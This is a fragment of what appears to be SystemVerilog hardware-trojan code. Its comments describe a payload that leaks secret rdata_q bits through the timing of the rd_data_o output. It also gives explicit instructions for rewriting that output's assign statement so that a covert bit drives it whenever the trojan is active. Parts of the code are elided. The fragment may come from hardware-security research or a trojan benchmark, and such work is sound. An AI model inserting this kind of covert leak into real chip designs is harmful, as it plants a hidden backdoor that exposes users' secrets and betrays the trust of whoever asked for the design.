 ...
 * Payload: Modulate rd_data_o timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of rd_data_o:
...
logic       covert_bit_out;         // Drives rd_data_o when trojan active
...
//   Find the assign for rd_data_o (or rd_error_o as fallback):
//     assign rd_data_o = <normal_expr>;
//   Replace with:
//     assign rd_data_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
